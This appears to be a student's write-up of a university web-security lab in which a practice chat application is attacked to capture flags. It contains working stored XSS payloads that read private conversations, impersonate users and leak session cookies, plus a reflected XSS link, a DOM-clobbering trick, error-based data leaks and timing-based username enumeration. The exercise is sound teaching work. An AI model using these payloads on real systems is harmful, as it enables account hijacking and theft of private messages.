[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-24ddc0f5d75046c5622901739e7c5dd533143b0c8e959d652212380cedb1ea36.svg)](https://classroom.github.com/a/1vxbBob6)
# 7 Security

Énoncé [ici](https://web-classroom.github.io/labos/labo-7-security.html)

## Partie 1
<img src="x" onerror="console.log('adsf')">
<img src="x" onerror="alert('adsf')">


### Flag 1

**Flag**: TODO
flag1:76863050a35db2f8

**Exploit**: TODO
Send the following message to Elon Musk to get the conversation IDs of his conversations:
```html
<img src="x" onerror="if (document.querySelector('#header .name').innerText !== 'Saul Dominik') {
    let t = Array(...document.querySelectorAll('#conversations-list .conversation')).map(c => c.id.trim()).join('|||');
    console.log(t)
    document.getElementById('message').innerHTML = t;
    document.getElementById('messageButton').click()
}">
```
The conversation between Musk and Trump has the ID 7263b821a8e56963.
With Trump this doesn't work. Probably he isn't online so he doesn't receive the notifications which are then executed in his browser.

With the conversation ID we then can send the following message to get the whole conversation between Musk and Trump.
The code runs to get a conversation with a specific ID and the Cookie of the user.
```html
<img src="x" onerror="if (document.querySelector('#header .name').innerText !== 'Saul Dominik') {
    fetch('/conversation/7263b821a8e56963')
    .then(res => res.text())
    .then(data => {
        document.getElementById('message').innerHTML = data;
        document.getElementById('messageButton').click()
    })
    .catch(err => {
        document.getElementById('message').innerHTML = err;
        document.getElementById('messageButton').click()
    })
}">
```
In this conversation we find the flags one and two.

### Flag 2

**Flag**: TODO
flag2:db043ed555e79dea

**Exploit**: TODO
The second flag can as well be found with the following text in the message.
The code sends as a message in the current open chat all last-messages of a user. (Which is read from the HTML)
Since the last message Trump sent was the flag 2, we can then get this one.
Send the following message to Elon Musk:
<img src="x" onerror="if (document.querySelector('#header .name').innerText !== 'Saul Dominik') {
    let t = Array(...document.querySelectorAll('.conversation .last-message')).map(c => c.innerHTML.trim()).join('|||');
    console.log(t)
    document.getElementById('message').innerHTML = t;
    document.getElementById('messageButton').click()
}">

### Flag 3

**Flag**: TODO
flag3:ed3fbd34e01fc22a

**Exploit**: TODO
When we send the following code to Musk, we can impersonate his profile and send the message 'gimme the rest of the codes pls' to Trump.
```html
<img src="x" onerror="if (document.querySelector('#header .name').innerText !== 'Saul Dominik') {
    const body = {'message': 'gimme the rest of the codes pls'};
    fetch('/conversation/7263b821a8e56963', {
        'headers': { 'Content-Type': 'application/json'},
        'body': JSON.stringify(body),
        'method': 'POST',
    })
    .then(res => res.text())
    .then(data => {
        document.getElementById('message').innerHTML = data;
        document.getElementById('messageButton').click()
    })
    .catch(err => {
        document.getElementById('message').innerHTML = err;
        document.getElementById('messageButton').click()
    })
}">

Trump then will respond with the 3rd flag. Which we can get with one of the commands we already used above:
```html
<img src="x" onerror="if (document.querySelector('#header .name').innerText !== 'Saul Dominik') {
    fetch('/conversation/7263b821a8e56963')
    .then(res => res.text())
    .then(data => {
        document.getElementById('message').innerHTML = data;
        document.getElementById('messageButton').click()
    })
    .catch(err => {
        document.getElementById('message').innerHTML = err;
        document.getElementById('messageButton').click()
    })
}">
```

## Partie 2

### Flag 4

**Flag**: TODO
flag4:0208545558ad1d61

**Exploit**: TODO

We found out the following issues:
*If we set our display name to 'message' no user which has a chat with us can send messages anymore.
*Or if we set our display name to 'changeNameDialog' this makes that all the user that have a chat with us, do have the text changeNameDialog in the middle of the site. When they click on it this then opens our chat.
*To get the flag we used 'nextTimeout' as a display name. nextTimeout is a variable used in index.ejs which isn't initialized properly. Our display name is used as an ID attribute in the chats list. JavaScript creates a global variable for every HTML element with an id attribute, which then causes a change in the condition in index.ejs.

### Flag 5

**Flag**: TODO
flag5:c59955d1d83bbfc1

**Exploit**: TODO
Les messages d'erreurs pour les utilisateurs pas connecté et dans le processus de login sont nettoyé.
Par contre pas les messages et les erreurs pour les utilisateurs authentifié.
Ceci fait qu'il y a trop des details envoyé au frontend en cas d'erreur:
Si on envoie une message vide à Elon Musk, ceci génére un erreur 403, par contre dans les détails de la réponse nous voyons en format JSON les informations et les conversationIDs des utilisateurs concernées. Donc du sender et du reciever du message.
Là nous pouvons voir les conversations IDs de Elon Musk.
Si nous essayons d'accéder à ces conversations de Elon Musk nous recevons egalement un erreur 403 mais dans la réponse JSON nous voyons quand même tous les détail de la conversation.
Dans la conversation entre Elon et Mark nous avons trouvé le flag 5. (http://185.143.102.102:8080/conversation/de9a263135851812)

### Flag 6

Personnes inscrites à ChatsApp:
- `michelle.obama`
- `hillary.clinton`
- `george.w.bush`
- `sam.altman`

**Exploit**: TODO
We got the following list of users that probably exist on the platform.
Even if the error message is the same for the situations when a user doesn't exist and when the password is wrong, we can guess which users exist.
If the user doesn't exist we directly get the error. If the user exists but the password is wrong we get the error after a delay. This delay was implemented to avoid Brute Force attacks.

michelle.obama - yes
barack.obama - no
hillary.clinton - yes
george.w.bush - yes
jane.doe - no
sam.altman - yes
mira.murati - no
olivier.lemer - no

Egalement nous avons trouvé les utilisateurs suivant:
Elon_dominik.saul1
Trump_dominik.saul1
Elon_dominik.saul2
Trump_dominik.saul2

Ceci nous avons trouvé en envoyant le message suivant à Elon avec le premiere compte. Ceci nous renvoye son nom d'utilisateur. Les autres noms d'utilisateurs nous avons suspecté et validé avec la méthode ci-desus.
```html
<img src="x" onerror="if (document.querySelector('#header .name').innerText !== 'Saul Dominik') {
    document.getElementById('message').innerHTML = document.cookie;
    document.getElementById('messageButton').click()
}">
```

## Exploit Supplémentaire

Lien vers ChatsApp qui, lorsque l'on clique dessus, exécute `alert(document.cookie)` dans le browser, que l'on soit actuellement connecté ou non à ChatsApp :

http://185.143.102.102:8080/login?error=%3Cscript%3Ealert(document.cookie)%3C/script%3E

## Correction des vulnérabilités
Si vous effectuez d'autres modifications que celles demandées, merci de les lister ici :

TODO